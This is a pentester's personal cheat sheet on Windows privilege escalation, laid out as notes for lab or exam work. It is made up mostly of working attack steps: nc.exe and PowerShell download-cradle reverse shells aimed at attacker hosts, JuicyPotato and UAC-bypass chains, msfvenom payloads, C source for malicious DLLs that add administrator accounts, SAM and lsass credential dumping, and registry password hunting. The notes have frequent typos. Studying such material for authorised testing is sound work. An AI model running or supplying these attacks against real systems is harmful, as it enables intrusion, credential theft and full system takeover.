WINDOWS PRIVILIEGE ESCALATION:
=============================
Basics:
	our goal is to get admin or system shell
	SYSTEM account:(NT Authority/System)
		It's an internal account that isn't shown inser control panel or anywhere else. It has same privileges as ADMINISTRATOR, But both of them have different functions.
	SAM(security accounts manager):(c:\windows\system32\config\SAM)
		Database having user accounts with hashed passwords
			Hash_format:
				username:useris:lan_manager_hash:NTLM_hash
				NTLM(NT LAN Manager):MD4
				LM Hash:DES Encryption
	Windows Vault:(Credential Manager)	
		stores credentials using which Windows log in the users automatically, which means that any Windows application that needs credentials to access a resource can make use of CWindows Vault and use the credentials supplied instead of users entering the username and password all the time.
	PowerShell: See PowerShell For Pentesting
	CommandPrompt: See CommandPrompt For Pentesting	
	ACL:(Acess Control List)
		A user/group access a resource(file/registery/service) on basis of ACL. 
		It provides permission
		Can be chacked via 2 ways:
			Accesscheck.exe => available both in cmd and ps
			Get-ACL => available in ps
	Windows Registry Fundamentals:
		Registeries are of 2 types:
			HKLM => LM means Local Machiene
			HKCU => CU means Current User
		Registry has keys like HKLM\Software\policies\windows\installer
		we can see Data inside keys:
			cmd> req query HKLM\Software\policies\windows\installer
	Sysinternal Tools:
		accesscheck.exe:
			This utility tells the permission that a user has for file/folder/registry
			Availabel in cmd
			accesscheck.exe -ucqv service_name => checks if we have read/write access to a service
			accesscheck.exe -wvu "c:\a\b\c\d" => checks permissions in a folder
				w => only show those enteries having "write"
				v => verbose
				u => ignore errors
		autorun.exe:
			it show autorun files
		procdump.exe:
			procdump.exe -accepteula -ma lsass.exe lssas.dmp => creating a dumpo of 
	important cmd tools:
		cacls:
			previously known as icacls
			it is used to EDIT permission of files
			cacls /t root.txt /e /p user_name:F
			options:
				/t => file name
				/e => edit the following object
				/p => permission (an object)
				/grant => it is same as /e /p combined
				F => Full access
Automated tools and their execution:
	execuatbles:(need to conv from .sln to .exe)
		winpeas.sln:(best)
		seatbelt.sln:
		watson.sln:(by RastaMouse)
			it looks for CVE's
			it depends on .net version of box, to check it
				windows\microsoft.net\framework\v2.0.50727\msbuild -version
		sharup.sln:
			same as powerup.ps1
			we can get precomplied binary online
		to make .exe from .sln:
			open them in visual studio and right-click -> build
			go to bin folder, we will find our executable
	powershell scripts:
		Note:
			ps> PowerShell -exec bypass
		sherlock.ps1:
			runs on its own
			looks for cve's
			edit it as follows:	
				append "Find-AllVulns"
		jaws-enum.ps1:
			it runs automatically, once IEX is finished
		powerup.ps1:
			looks for juicy stuff and PE vectors
			its a part of "powersploit", a suite of different powershell scripts
			>. ./powerup.ps1
			>Invoke-AllChecks
	others:
		Windows Exploit Suggesters:
			Windows expoit suggester:
				https://github.com/AonCyberLabs/Windows-Exploit-Suggester
				windows-exploit-suggester.py --update
				windows-exploit-suggester --database <> --systeminfo <>
				Issue:
					its not working in kali as its written in python2 and needs a package which can only be installed using python-pip (no longer availabel in kali)
			wesng:(Windows Exploit Suggester Next Generation)
				https://github.com/bitsadmin/wesng
				wes.py --update
				wes.py systeminfo.txt -e
					-e => show only those vuln which have an exploit
		post/recon/multi/local_exploit_suggester
	based on which shell we have:
		when we ONLY have CMD shell avilable:
			winpeas.sln
			seatbelt.sln
			watson.sln
			sharup.sln
				cmd>abcd.exe
			windows-exploit-suggester.py 
			msf>local_exploit_suggester
		When we have PS, but we cant download any file:
			jaws-enum.ps1:
				it runs automatically, once IEX is finished.
			sherlock.ps1
		When we have PS, and we can download any file:
			powerup.ps1
		when we want to use PS, but from cmd:
			powershell \" IEX(New-Object Net.WebClient).downloadstring('http://ip:port/filename') \" => we need to use \"\" to download files from cmd using powershell
Manual Enumeration:
	Username:
		whoami
		echo %userdomain%
		echo %username%
		echo %USERNAME%
		set => shows all enviroment vairables
		SET U => It will return any environment variables that start with U.
		A bunch of environment variables have the user:
			TEMP=C:\DOCUME~1\User\LOCALS~1\Temp
			TMP=C:\DOCUME~1\User\LOCALS~1\Temp
			USERNAME=user
			USERPROFILE=C:\Documents and Settings\user
		If nothing works, transfer whoami.exe from kali to windows using smbserver
	systeminfo
	hostname
	net user => list all users
	net localgroup
	ipconfig /all & route print & arp -a => Network information
	netstat -ano => List open connections
	netsh firewall show state => firewall info
	netsh firewall show config
	services:
		net start
		wmic service list brief
		tasklist /SVC
ADS:(alternate data stream)
	dir /r => to see if ADS exists
		file1.txt:file2.txt => yes
	powershell:
		PS> get-item .\file.txt -stream * => show all stream names
		PS> get-item .\file.txt -stream stream_name.txt => see data of that stream
		PS> set-content -path file1_path -stream stream_name => add stream
		PS> remove-item –path file1_path –stream stream_name => remove stream
	command prompt:
		cmd> powershell (get-content file.txt -stream stream_name.txt)
		cmd> notepad file1.txt:file2.txt => see ADS
		cmd> echo "abcd" > file1.txt:file2.txt => create ADS
APPLOCKER Bypass:
	Applocker blocks execution of scripts in cmd and PS
	github => ultimateapplockerbypasslist by api0cradle
Windows Subsystem for linux:
	2016 onwards
	allows linux over windows
	wsl.exe + bash.exe
	locating them:
		where \R C:\ bash.exe
		where \R C:\ wsl.exe
			\R => recursive
		wsl.exe whoami
			mostly we are ROOT in WSL
		bash.exe => it will give us a linux shell
			convert it to a TTY shell
			NOTE: always look at .bash_history
			>history => same as .bash_history
Windows XP sp1 exploitation:
	https://guide.offsecnewbie.com/privilege-escalation/windows-pe
	Do these:
		sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe YOUR_IP 1234 -e C:\WINDOWS\System32\cmd.exe"
		sc config upnphost obj= ".\LocalSystem" password= ""
		sc qc upnphost
		sc config SSDPSRV start= auto
		net start SSDPSRV
		net start upnphost
	We will get NT Authority/SYSTEM
Kernel Exploitation:
	cmd> systeminfo => know the system info
	we can use windows_exploit_suggester/watson.exe
	msf> post/windows/gather/enum_patches => hotfixes
	github.com/secwiki/windows-kernel-exploits/ => windows kernel exploits exe and poc
Token impersonation and potato attack:
	Basics:
		Tokens:
			Temp keys that allows us to access a system/network without credentials. They are like COOKIES,but for windows.
			Two types of tokens:
				Delegate:
					These are created for ‘interactive’ logons, such as logging into the machine or connecting to it via Remote Desktop. 
				Impersonate:
					These are created for ‘non-interactive’ sessions, such as attaching a network drive or a domain logon script.
				When a user logs off, their delegate token is reported as an impersonate token, but will still hold all of the rights of a delegate token.
		finding tokens:
			C:\> whoami /priv => it will show prvileges
			meterpreter> getprivs
		Vulnerable tokens:
			SEImpersonatePrivilege
			SEAssignPrimaryToken
	Using Meterpreter:(automated way)
		load incognito => a module foe token exploitaion and impersonation
		list_tokens -u => lists the availabel tokens
		Impersonate_token "token_name" => it will impersonate the specified token 
	Potato Exploits:(manual way)
		Hot-Potato->RottenPotato->RottenPotatoNG->LonelyPotato->JuicyPotato->RoguePotato->JuicyPotato_2
		HotPotato:(https://github.com/foxglovesec/Potato)
			For Windows 7/8/10 and Server 2008/2012
			usage:
				no longer in use
				executable => https://github.com/foxglovesec/Potato
				powershell script =>  https://github.com/Kevin-Robertson/Tater
					it is PS version of potato exploit
		RottenPotato:(https://github.com/foxglovesec/RottenPotato)
			aka ms16_075_reflection in metasploit
			Usage:
				no longer in use => github page says shift to RottenPotatoNG
		RottenPotatoNG:(https://github.com/breenmachine/RottenPotatoNG)
			Basically RottenPotatoNG is version2 of RottenPotato
			Usage:
				After having a meterpreter shell with incognito mode loaded:
					MSFRottenPotato.exe t c:\windows\temp\test.bat
		LonelyPotato:(https://github.com/decoder-it/lonelypotato)
			Lonely Potato was the adaptation of Rotten Potato without relying on meterpreter and the “incognito” module
			usage:	
				no longer in use. The github link says "shift to juicy-potato"		
		JuicyPotato:(https://github.com/ohpe/juicy-potato/releases)
			aka ms16_075_reflection_juicy in metasploit
			If the machine is < Windows 10 1809 < Windows Server 2019 - Try Juicy Potato
			Usage:
				JuicyPotato -l lport -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe lhost lport" -t * => to use nc.exe
				JuicyPotato.exe -l lport -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://lhost:8080/rev.ps1')" -t * => to use ps reverse shell
				flags:
					-l lport
					-p c:\windows\system32\cmd.exe
						we always use "\system32\cmd.exe" is SYSTEM shell
					-a "arguments to pass to program(-p)"
						example:
							-a "/c c:\users\public\desktop\nc.exe -e cmd.exe lhost lport"
					-t *
						it defines createprocess call:
							t => CreateProcessWithTokenW
							u => CreateProcessAsUser
							* => both
					-c {clsid_value}:
						https://ohpe.it/juicy-potato/CLSID/ => list of clsids based on OS
						default => {4991d34b-80a1-4291-83b6-3328366b9097}
					Optional:
						-m <ip>: COM server listen address (default 127.0.0.1)
						-k <ip>: RPC server ip address (default 127.0.0.1)
						-n <port>: RPC server listen port (default 135)
						-z only test CLSID and print token's user
			Note:
				Use LovelyPotato
		LovelyPotato:(https://github.com/TsukiCTF/Lovely-Potato)
			Its a Powershell wrapper of JuicyPotato for easy exploitation
			Why Use Lovely Potato:
				For simplicity. Manually uploading various files to target host can be easily avoided with automation. Also, listing entire CLSIDs on the system and identifying privilege for each of them takes very long time if done by sending commands. You can easily switch binaries in the repo any time without having to recode Invoke-LovelyPotato.ps1. Ex) Recompiling JuicyPotato for customization / Obfuscating your meterpreter for AV evasion
			Usage:
				Modify the two following variables in 'Invoke-LovelyPotato.ps1':
					$RemoteDir = "http://[AttackerIP]
					$LocalPath = "[WritablePathOnVictimMachine]"
						any path in which we can write files
						C:\>mkdir temp2
				Create a payload:
					msfvenom -p windows/shell_reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] -f exe -o meterpreter.exe
					 	Note: name must be meterpreter.exe
				python3 -m http.server 80
				nc -nvlp 4444
				On the initial shell:
					 IEX(New-Object Net.WebClient).DownloadString('http://[AttackerIP]/Invoke-LovelyPotato.ps1')
			Note:
				this exploit takes roughly 10-20 mins to run, so dont panic and just wait.
				we can track progress as follows:
					go to the directory($LocalPath mentioned in Invoke-LovelyPotato.ps1):
						type result.log
		RoguePotato:(https://github.com/antonioCoco/RoguePotato)
			Released on 11 may 2020
			If the machine is >= Windows 10 1809 & Windows Server 2019 - Try Rogue Potato
			Usage:
				.\RoguePotato.exe -r lhost -e "C:\windows\system32\cmd.exe /c {command}" -l lport
				flags:
					-r lhost
					-e program
					-l lport
					-c {clsid}: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
		SweetPotato:(https://github.com/CCob/SweetPotato)
			Released on 13 may 2020
			The tool was designed to be used with Cobalt Strike’s execute-assembly command, so it carries no baggage in the form of dependencies
			Usage:
				flags:
					-c, --clsid=VALUE          CLSID (default BITS: 4991D34B-80A1-4291-83B6-3328366B9097)
					-m, --method=VALUE         Auto,User,Thread (default Auto)
					-p, --prog=VALUE           Program to launch (default cmd.exe)
					-a, --args=VALUE           Arguments for program (default null)
					-e, --exploit=VALUE        Exploit mode [DCOM|WinRM|PrintSpoofer(default)]
					-l, --listenPort=VALUE     COM server listen port (default 6666)
					-h, --help                 Display this help
		JuicyPotato_2:(https://github.com/decoder-it/juicy_2)
			Released on 30 may 2020
			JuicyPotato for Win10 > 1803 & Win Server 2019
			IDK the difference between juicy2 and RoguePotato, consider the following links:
				https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html
				https://2020.romhack.io/dl-2020/RH2020-slides-Cocomazzi.pdf
		Note:
			CLSID(Class ID) is a globally UUID that identifies a COM class object.
runas.exe:(c:\windows\system32\runas.exe)
	Its a windows utility which allows users to run some command using privileges of another user
	c:/> cmdkey /list => shows currently stored credentials
	c:/> c:\windows\system32\runas.exe /user:hostname\username /savecred "c:\windows\system32\cmd.exe" /c command_to_run => it will run command as the user_name
Startup Application:(C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup)
	discovery:
		accesscheck.exe -wvu "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
	exploitation:
		we place malicious.exe in "startup" folder and reboot system and wait for admin to log-in.
	requirement:
		administrator should log-in after reboot!
Service Exploitation:
	Basics:
		Services are mainly progs that run in background
		A service running as Administrator/SYSTEM with incorrect file permissions might allow EoP.
		You can replace the binary with a reverse shell or a command that creates a new user and adds it to the Administrator group, restart the service and get system.
		To start/stop a service:
			1. wmic service NAMEOFSERVICE call startservice	
			2. net stop [service name] && net start [service name]
			3. sc start/stop serviceName
	Enumeration:
		Powerup.ps1 Invoke-AllChecks => this will show all services
		accesscheck.exe -uwcv Everyone * => manaul way to see which servies have W permission
			c => show service name
			Everyone => its a group name
			it will show us any service having write permission
		Note:
			we need to find a service which:
				can be RW
				can be restarted (can be found out via powerup.ps1)
	Binary paths:(binpath)
		Basics:
			The “binPath” is the location that points the service to the binary that need to execute when the service is started.
		Exploitation:(getting a new shell)
			msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT= -f exe > shell.exe
				transfer this shell to victim machiene
			sc qc service_name => it will show binary path name
			sc config service_name binpath="C:\windows\system32\shell.exe"
			sc start service_name => it will start service again, resulting in us becoming admin
		Exploitation:(running a command to become admin)
			sc qc service_name => it will show binary path name
			sc config service_name binpath= "net localgroup administrators user/add"
			sc start service_name => it will start service again, resulting in us becoming admin
	Unquoted service paths:
		Basics:
			when a service dont has its path enclosed in quotes AND the path contains space, then its vulnerable.
			lets say an executable is located at c:\p1\p p\p p p\ex.exe, in such cases, the service starts to look for its execuatble by going from directory to directory like this:
				c:\something.exe -> c:\p1\something.exe -> c:\p1\p p\something.exe and so on
		Exploitation:
			we place a malicious execuatble in any of subdirectories of path, where we have write permission
				we find permissions using "accesscheck" utility
			sc start service_name
	Insecure Service Executable:
		some executables are attached to services, so we manipulate those excutables and restart the service to exploit
		Exploitation:
			create malc.exe using msfvenom and transfer it to folder of executable-to-exploit
			cmd>sc start service_attached_to_executable
	regsvc:(Registry Service)
		Basics:
			Windows Registery stores enteries for each service and each entry can have ACLs.
			We can exploit these ACLs if we cant expoit the services directly
			To check ACL:
				PS> Get-ACL -path hklm:\system\currentcontrolset\services\regsvc | format-list
					if output is NT Authority\user Full_Access => boom
			We add malc.exe to regsvc and then restart the service
		Explotation:
			create malc.exe using msfvenom and transfer it to c:/temp
			cmd> reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
				reg add => add to this registry
				/v => add into the following key
				"ImagePath" => a registry-key of "regsvc" which stores path of drivers images file. it will store path of our executable file and run it.
				/t => type
				REG_EXPAND_SZ => it tells "ImagePath" will store a string in it
					string_value => "/d c:\temp\x.exe"
				/d => data
				/f => dont prompt anything, do it quietly.
			cmd> sc start regsvc ( restarting service)
	DLL Hijacking:(Dynamic Link Library Hijacking)
		In Windows environments when an application or a service is starting it looks for a number of DLL’s in order to function properly.
		If these DLL’s doesn’t exist or are implemented in an insecure way (DLL’s are called without using a fully qualified path) then it is possible to escalate privileges by forcing the application to load and execute a malicious DLL file.
		Basics:
			Its basically tricking a legitimate/trusted application into loading an arbitrary DLL.
			Dll hijacking can be used:
				1. to execute code
				2. obtain persistence
				3. privilege escaltion
			Approaches for DLL HIjacking:
				DLL replacement:
					replace a legitimate DLL with an evil DLL.
					This can be combined with DLL Proxying, which ensures all functionality of the original DLL remains intact.
				DLL search order hijacking:
					DLLs specified by an application without a path are searched for in fixed locations in a specific order.
					Hijacking the search order takes place by putting the evil DLL in a location that is searched in before the actual DLL. This sometimes includes the working directory of the target application.
				Phantom DLL hijacking:
					drop an evil DLL in place of a missing/non-existing DLL that a legitimate application tries to load.
				DLL redirection:
					change the location in which the DLL is searched for, e.g. by editing the %PATH% environment variable, or .exe.manifest / .exe.local files to include the folder containing the evil DLL
				WinSxS DLL replacement:(aka DLL side-loading)
					replace the legitimate DLL with the evil DLL in the relevant WinSxS folder of the targeted DLL.
				Relative path DLL Hijacking:
					copy (and optionally rename) the legitimate application to a user-writeable folder, alongside the evil DLL.
		Finding dll to hijack:
			Using Find-ProcessDLLHijack:(module of powersploit's powerup.ps1)
				Find-ProcessDLLHijack => Finds all DLL hijack locations for currently running processes.
				Find-ProcessDLLHijack -ExcludeOwned => Finds possible hijackable DLL location for processes not owned by the current user.
				Get-Process VulnProcess | Find-ProcessDLLHijack => Finds possible hijackable DLL locations for the 'VulnProcess' processes.	
			Using procmon:		
				use filter "path ends with .dll && result is NAME NOT FOUND"
				can be used on RDP
		Finding a place to put evil.dll:
			Factors to consider:
				Dll Search Order => where is .dll going to be searched
				Folder Permission => write permissions for the folder in which evil.dll is to be put
			Dll Search Order:
				Generally, a Windows application will use pre-defined search paths to find DLL's and it will check these paths in a specific order.	
					directory of program
					c:\windows\system32
					c:\windows\system
					c:\windows
					current working directory
					Directories in the system PATH environment variable
					Directories in the user PATH environment variable
						C:\>path => to see PATH variable
				DLL hijacking usually happens by placing a malicious DLL in one of these paths while making sure that DLL is found before the legitimate one.
			Folder Permission:
				accesschk.exe -dqv "C:\temp"
				icacls "C:\temp"
				Check permissions of all folders inside PATH:
					Find-PathDLLHijack:(module of powersploit's powerup.ps1)
						Finds all directories in the system %PATH% that are modifiable by the current user.
					for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
		creating evil.dll:
			Automated:	
				Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.dll' => this will add a malicious dll at 'C:\Temp\wlbsctrl.dll' which will  add a user to local administrators with a predefined password.
					default => john:Password123!
			msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o evil.dll
			Manual dll:
				manual dll-1:(Tested in Win10)
					code:
						#include <windows.h>
						BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
						    switch(dwReason){
						        case DLL_PROCESS_ATTACH:
						            system("whoami > C:\\users\\username\\whoami.txt");
						            WinExec("calc.exe", 0); //This doesn't accept redirections like system
						            break;
						        case DLL_PROCESS_DETACH:
						            break;
						        case DLL_THREAD_ATTACH:
						            break;
						        case DLL_THREAD_DETACH:
						            break;
						    }
						    return TRUE;
						}			
					usage:
						i686-w64-mingw32-g++ dll.c -lws2_32 -o evil.dll -shared
				manual dll-2:
					code:
						#include <windows.h>
						BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
						    if (dwReason == DLL_PROCESS_ATTACH){
						        system("cmd.exe /k net localgroup administrators user /add");
						        ExitProcess(0);
						    }
						    return TRUE;
						}			
					usage:
						x86_64-w64-mingw32-gcc windows_dll.c -shared -o evil.dll => For x64
						i686-w64-mingw32-gcc windows_dll.c -shared -o evil.dll => For x86
				manual dll-3:
					code:
						#include <windows.h>

						int owned()
						{
						  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
						  exit(0);
						  return 0;
						}

						BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
						{
						  owned();
						  return 0;
						}			
					usage:
						x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
						x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a
				manual dll-1:
					code:
						#include<windows.h>
						#include<stdlib.h>
						#include<stdio.h>

						void Entry (){ //Default function that is executed when the DLL is loaded
						    system("cmd");
						}

						BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
						    switch (ul_reason_for_call){
						        case DLL_PROCESS_ATTACH:
						            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
						            break;
						        case DLL_THREAD_ATTACH:
						        case DLL_THREAD_DETACH:
						        case DLL_PROCESS_DEATCH:
						            break;
						    }
						    return TRUE;
						}			
					usage:
						i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o evil.dll
				Note:
					the Dll that you compile must export several functions that are going to be loaded by the victim process, if these functions doesn't exist the binary won't be able to load them and the exploit will fail.
		Once, evil.dll is created, transfer it to victim
		if we have attacked a service:
			Restart the service => explained above
		if we have attacked an application:
			wait for the application.exe to attempt to load evil.dll
Registry Exploits:
	Autorun Programs:
		Discovery:
			powersploit/winpeas
			if we have rdp(3309) available, then, in rdesktop download "autorun.exe" and run it. it will show us autorun files
				In LOGON tab, we see those files which will run as user who logs_out and logs_in
			to check folder permission(r/w/x) of autorun program
				accesscheck.exe -wvu "path-to-folder"
				w => only show those enteries having "write"
				v => verbose
				u => ignore errors
				if we have ALL_ACCESS, we are good to go!
		Exploiation:
			create malicious.exe and transfer it to folder of autorun program
			then, admin logs_in and logs_off, so that we get a shell as admin
		Requirement:
			admin should log_in and log_out.
	AlwaysInstallElevated:
		If it is enabled, then any user can install .msi(microsoft installer) files as NT AUTHORITY\SYSTEM.
		Discovery:
			cmd> req query HKLM\SOFTWARE\POLICIES\MICROSOFT\WINDOWS\INSTALLER
			cmd> req HKCU\SOFTWARE\POLICIES\MICROSOFT\Windows\INSTALLER
			If the value of REG_DWORD of "AlwaysInstallElevated" 0x1, then user of any privilege level is allowed to install .msi files as NT AUTHORITY\SYSTEM.
		Exploiation:
			Manual:
				generate a .msi file using msfvenom
				start a handler
				transfer file to c:\temp
				C:\>msiexec /quiet /qn /i C:\temp\malicious.msi
			Automated:
				msfconsole => exploit/windows/local/always_install_elevated
UAC Bypass:
	Scenario:
		The shell belongs to the local Administrators group but UAC is enabled and needs to be bypassed, before we can elevate to SYSTEM.
	Basics:
		Integrity Levels:
			From Windows Vista, all protected objects are labeled with an integrity level
			Note that a process with a lower integrity level can’t write to an object with a higher integrity level.
			1. Untrusted:
				processes that are logged on anonymously are automatically designated as Untrusted. Example: Chrome
			2. Low:
				The Low integrity level is the level used by default for interaction with the Internet. As long as Internet Explorer is run in its default state, Protected Mode, all files and processes associated with it are assigned the Low integrity level. a low integrity process is very restricted, it cannot write to the registry and it’s limited from writing to most locations in the current user’s profile.  Example: Internet Explorer or Microsoft Edge
			3. Medium:
				Medium is the context that most objects will run in. Standard users receive the Medium integrity level, and any object not explicitly designated with a lower or higher integrity level is Medium by default. Not that a user inside the Administrators group by default will use medium integrity levels.
			4. High:
				Administrators are granted the High integrity level. This ensures that Administrators are capable of interacting with and modifying objects assigned Medium or Low integrity levels, but can also act on other objects with a High integrity level, which standard users can not do. Example: "Run as Administrator"
			5. System:
				System integrity level is reserved for the system. The Windows kernel and core services are granted the System integrity level. Being even higher than the High integrity level of Administrators protects these core functions from being affected or compromised even by Administrators. Example: Services
			6. Installer:
				The Installer integrity level is a special case and is the highest of all integrity levels. By virtue of being equal to or higher than all other WIC integrity levels, objects assigned the Installer integrity level are also able to uninstall all other objects.
			To know the integrity level of a user(shell):
				whoami /groups
		UAC:(User Access Control)
			UAC is used to allow an administrator user to not give administrator privileges to each process executed. This is achieved using default the low privileged token of the user.
			Running cmd.exe from the Start menu without select ‘Run as administrator’ will give a shell without admin privileges, For Example:
				You cannot for example write to C:\Windows\System32 as it will give Access is denied error.
			For tasks which require privilege elevation, the administrator SID is used after the prompt on Secure Desktop has been clicked away
			Secure Desktop:
				The Secure Desktop’s primary difference from the User Desktop is that only trusted processes running as SYSTEM are allowed to run here
			UAC Settings:
				1. Always Notify. This setting is the highest UAC setting. It will prompt the user when any program, including a built-in Windows program wants higher privileges.
				2. Notify me only when programs try to make changes to my computer. This is the default UAC setting. This setting does not prompt the user when some built-in Windows program want higher privileges. It will prompt the user when any other program wants higher privileges. This distinction is important and it plays into the UAC bypass attack that we will cover in a moment.
				3. Notify me only when programs try to make changes to my computer (do not dim my desktop). This is the same as the default setting, except the user’s desktop does not dim when the UAC elevation prompt comes up. This setting exists for computers that lack the computing power to dim the desktop and show a dialog on top of it.	
				4. Never notify. This option takes us back to life before Windows Vista. On Windows 7, if a user is an administrator, all of their programs will run with high integrity. On Windows 8, programs run at the medium integrity level, but anything run by an Administrator that requests elevated rights gets them without a prompt.
	Requirements:
		whoami /groups
			it should have "Mandatory Label\High Mandatory Level" group => we need to have moderate integrity shell
	Checking UAC settings:
		reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
			See value of 'EnableLUA' key:
				0 => UAC is disabled
				1 => UAC is enabled, then see these values:
					ConsentPromptBehaviorAdmin:
						0 => UAC won't prompt (like disabled)
						1 => the admin is asked for username and password on secure desktop to execute the binary with high rights
						2 => (Always notify me) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges
						5 => (default) it will ask the administrator to confirm to run non Windows binaries with high privileges
					PromptOnSecureDesktop:
						Values => 0 or 1
			Summary:
				If EnableLUA=0 or doesn't exist => no UAC for anyone
				If EnableLua=1 and LocalAccountTokenFilterPolicy=1 => No UAC for anyone
				If EnableLua=1 and LocalAccountTokenFilterPolicy=0 and FilterAdministratorToken=0 => No UAC for RID 500 (Built-in Administrator)
				If EnableLua=1 and LocalAccountTokenFilterPolicy=0 and FilterAdministratorToken=1 => UAC for everyone
	Automated Method:
		metasploit => exploit/windows/local/bypassuac_eventvwr
	UACMe:(https://github.com/hfiref0x/UACME)
		Its a compilation of several UAC bypass exploits.
		akagi32 [Key] [Param] or akagi64 [Key] [Param
			key => number of method to use
				https://github.com/hfiref0x/UACME/blob/master/README.md
			param:
				Its optional
				takes a command, example: executable file name including full path to run.
				If empty => program will execute elevated cmd.exe
	Manual Bypassing method-1:(https://github.com/turbo/zero2hero/)
		Step-1 - Elevate cmd shell from Medium to High integrity:
			Usage:
				wget https://raw.githubusercontent.com/turbo/zero2hero/master/main.c
				edit main.c:
					remove comments
					change line "strcat(curPath, "\\foobar.exe");" to "strcat(curPath, "\\revshell.exe");"
			 	x86_64-w64-mingw32-gcc main.c -o eventvwr-bypassuac-64.exe
			 	msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=172.50.50.50 LPORT=3333 -f exe -o revshell.exe
			 	transfer both revshell.exe and eventvwr-bypassuac-64.exe to target\
			 	c:/>eventvwr-bypassuac-64.exe
			 	nc -nvlp 3333 => got shell 
			Explanation:
				We got a High intergrity shell, means we unlocked more privileges which may or may not be enabled
				whoami /priv
		Step-2 - Elevate from High integrity cmd shell to SYSTEM:
			Usage:
				msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=172.50.50.50 LPORT=4444 -f exe -o revshell2.exe
				transfer psexec.exe and revshell2.exe to target
				C:\>PsExec64.exe -i -accepteula -d -s C:\temp\revshell2.exe
				nc -nvlp 4444 => got shell 
			Explanation:
				we got system shell
		Note:
			 At ‘Always notify’, in which case ConsentPromptBehaviorAdmin = 2 and PromptOnSecureDesktop = 1, this method will not work
	Manual Bypassing method-2 using bypassuac.exe:
		Step-1 - Elevate cmd shell from Medium to High integrity:	
			In kali, we have:
				bypassuac-x86.exe
				bypassuac-x64.exe
			transfer the exploit according to arch to the target
			msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=172.50.50.50 LPORT=1234 -f exe -o shell.exe
			C:\>bypassuac-x64.exe /c C:\temp\shell.exe
			nc -nvlp 1234 => got shell
		Step-2 - Elevate from High integrity cmd shell to SYSTEM:
			msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=172.50.50.50 LPORT=2222 -f exe -o shell2.exe
			transfer psexec.exe and shell2.exe on target
			C:\>PsExec64.exe -i -accepteula -d -s C:\temp\shell.exe
			nc -nvlp 2222 => got shell as system
	Manual Bypassing method-3 by exploiting fodhelper.exe:
		Fodhelper.exe was introduced in Windows 10 to manage optional features like region-specific keyboard settings. It’s location is: C:\Windows\System32\fodhelper.exe and it is signed by Microsoft. The program is allowed to elevate itself to run in a high integrity context automatically. There is no need for any user interaction to allow the process to elevate.
		https://raw.githubusercontent.com/winscripting/UAC-bypass/master/FodhelperBypass.ps1
	Bypassing UAC via DLL Hijacking:
		Here, we find a process/application that has "autoelevate" and then do DLL Hijacking for that process
	What is "Run as Administrator"
Credentials mining:(important part in privesc)
	Dumping Sam file:
		dumping windows hashes using registery hives:
			C:\> mkdir temp
			C:\> reg.exe save hklm\sam c:\temp\sam.save
			C:\> reg.exe save hklm\security c:\temp\security.save
			C:\> reg.exe save hklm\system c:\temp\system.save
			tranfer these using smbserver
			secretsdump.py -sam sam.save -security security.save -system system.save LOCAL => gives ntlm hashes
				Full guide of secretsdump.py is in Active Directory sheet
		mimikatz.exe: Shown below
		meterpreter:
			hashdump
		samdump2 SYSTEM SAM
	Cracking ntlm hashes:
		https://samsclass.info/123/proj10/px16-hashcat-win.htm
		hashcat -m 1000 -a 0 -o out.txt hashes.txt wordlist.txt
	Memory Password mining:	
		Procdump.exe:(sysinternals tool)
			Its used to dump processes in memory, Services like FTP have credentials in clear text in memory.So, we can dump memory and read the credentials.
			procdump.exe -accepteula -ma lsass.exe lsass.dmp
			copy dump file to local windows machine of same arch
		mimikatz.exe: Shown below
	Grabbing Clear Text Passwords From Memory:
		Note:
			winpeas do it automatically 
		WCE:(Windows Credential Editor)
			It allows to list windows logon sessions and add/delete/change/list associated crentials(LM/NT hash,kerbros tickets, passwords)
			wce -l => list logon sessions and hashes
			wce -w => to dump clear text passwords
			issue:
				can easily invoke antivirus/windows_defender
		mimikatz: Shown below
		Note:
			we need admin privileges to run both WCE and mimikatz
	Password hunting from strings:
		Note:
			winpeas do it automatically 
		Manual:
			findstr /si password *.txt *.ini *.config
			dir /s *pass* == *cred* == *vnc* == *.config*
			Searching in Registry Keys:
				Passwords:
					reg query HKLM /f password /t REG_SZ /s
					reg query HKCU /f password /t REG_SZ /s
				SSH keys:	
					SSH private keys can be stored inside the registry key "HKCU\Software\OpenSSH\Agent\Keys"
					reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
					once found, they can be decrypted using::
						https://github.com/ropnop/windows_sshagent_extract
	mimikatz:
		C:\>mimikatz.exe
				privilege::debug
